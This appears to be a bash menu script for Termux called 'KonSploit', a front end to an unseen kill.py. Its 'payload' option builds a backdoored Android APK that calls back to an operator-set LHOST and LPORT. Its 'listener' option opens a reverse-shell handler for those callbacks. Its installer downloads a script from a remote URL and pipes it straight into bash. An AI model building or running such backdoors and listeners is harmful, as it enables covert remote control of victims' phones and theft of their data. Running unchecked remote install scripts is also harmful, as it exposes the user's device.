#!/data/data/com.termux/files/usr/bin/bash
#!/bin/bash

banner (){
echo  """
_______________________________________________________________^
							       |
╭╮╭━╮╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╱╱╱╭╮╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭╮  |
┃┃┃╭╯╱╱╱╱╱╱╱╱╱╱╱╱┃╭━╮┃╱╱┃┃╱╱╱╭╯╰╮╱┃╭━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃  |
┃╰╯╯╭━━┳━╮╭━━┳━━┳┫╰━━┳━━┫┃╭━━╋╮╭╯╱┃╰━━┳━┳━━┳╮╭┳━━┳╮╭╮╭┳━━┳━┫┃╭╮|
┃╭╮┃┃╭╮┃╭╮┫╭╮┃╭╮┣╋━━╮┃╭╮┃┃┃╭╮┣┫┣━━┫╭━━┫╭┫╭╮┃╰╯┃┃━┫╰╯╰╯┃╭╮┃╭┫╰╯╯|
┃┃┃╰┫╰╯┃┃┃┃╰╯┃╰╯┃┃╰━╯┃╰╯┃╰┫╰╯┃┃╰┳━┫┃╱╱┃┃┃╭╮┃┃┃┃┃━╋╮╭╮╭┫╰╯┃┃┃╭╮╮|
╰╯╰━┻━━┻╯╰┫╭━┻━━┻┻━━━┫╭━┻━┻━━┻┻━╯╱╰╯╱╱╰╯╰╯╰┻┻┻┻━━╯╰╯╰╯╰━━┻╯╰╯╰╯|
╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱┃┃  Author  :  			       |
╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╱╱╱╱╰╯            Muhamad Ilham Fadilah       |
_______________________________________________________________|
""" |lolcat
sleep 0.5
}

a(){
	read -p "•> KonSploit('menu')/> " menu
}

help(){
	echo "            =• payload"
	sleep 0.2
	echo "            =• listener"
	sleep 0.2
	echo "            =• help / ?"
	sleep 0.2
	echo "            =• clear"
	sleep 0.2
	echo "            =• exit"
	sleep 0.2
	droid
}

payload(){
	echo
	read -p "•> KonSploit('listener')/> Backdoor Name/> " name
	sleep 0.1
	read -p "•> KonSploit('listener')/> Set LHOST/> " lhost
	sleep 0.1
	read -p "•> KonSploit('listener')/> Set LPORT/> " lport
	sleep 2
	echo "Waiting ..."
	python3 kill.py --build --ip $lhost --port $lport --output $name.apk
	sleep 1
	main
}

listener(){
	echo
	read -p "•> KonSploit('listener')/> Set LHOST/> " lhost2
	sleep 0.2
	read -p "•> KonSploit('listener')/> Set LPORT/> " lport2
	sleep 2
	python3 kill.py --shell --ip $lhost2 --port $lport2
	sleep 1
	main
}


droid(){
	echo
	a
	echo

		if [ $menu = "?" ];
	then
	help

		elif [ $menu = "help" ];
	then
	help

		elif [ $menu = "listener" ];
	then
	listener

		elif [ $menu = "payload" ];
	then
	payload

		elif [ $menu = "exit" ];
        then
	figlet "Bye" |lolcat
	sleep 2
	exit

		elif [ $menu = "clear" ];
	then 
	clear

		else
	echo
	echo "Enter 'help' or '?'"
	sleep 1
	main

	fi
}

main(){
	clear
	banner
	droid
}

installtools(){
	clear
	banner
	echo
	echo "[*] Installing Tools ..."
	sleep 2
	apt install unzip
	unzip foldercode.zip
	unzip Jar_Files.zip
	rm -f foldercode.zip
	rm -f Jar_Files.zip
	pkg install wget
	pkg install wget && wget https://raw.githubusercontent.com/MasterDevX/java/master/installjava && bash installjava
	apt install python
	pip install colorama
	sleep 1
	rm -f installjava
	sleep 0.5
	main
}

installtools
main
